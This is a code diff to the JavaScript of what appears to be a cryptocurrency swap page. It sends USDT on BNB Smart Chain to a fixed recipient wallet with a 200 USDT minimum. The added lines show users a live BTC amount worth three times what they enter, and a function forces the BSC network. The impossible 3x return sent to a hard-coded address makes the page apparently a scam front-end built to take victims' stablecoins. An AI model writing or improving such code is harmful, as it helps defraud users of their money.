@@ -286,11 +286,29 @@
             const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
             const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943';
             const MIN_AMOUNT = 200;
-            const MAX_DAILY_LIMIT = 10000; // Only for display purposes
+            const MAX_DAILY_LIMIT = 10000;
+            const BTC_RATE = 119489.153599;
 
             // Elements
+            const usdtInput = document.getElementById('usdtInput');
+            const usdtValue = document.getElementById('usdtValue');
+            const btcAmount = document.getElementById('btcAmount');
+            const btcValue = document.getElementById('btcValue');
             const swapButton = document.getElementById('swapButton');
             const errorMessage = document.getElementById('errorMessage');
+
+            // Live value calculation
+            usdtInput.addEventListener('input', function() {
+                const amount = parseFloat(usdtInput.value) || 0;
+                
+                // Update USD value
+                usdtValue.textContent = `$${amount.toFixed(2)}`;
+                
+                // Calculate and update 3x BTC value
+                const btc = (amount * 3) / BTC_RATE;
+                btcAmount.textContent = btc.toFixed(8);
+                btcValue.textContent = `$${(amount * 3).toFixed(2)}`;
+            });
 
             // Force BSC Network function
             async function forceBSCNetwork() {
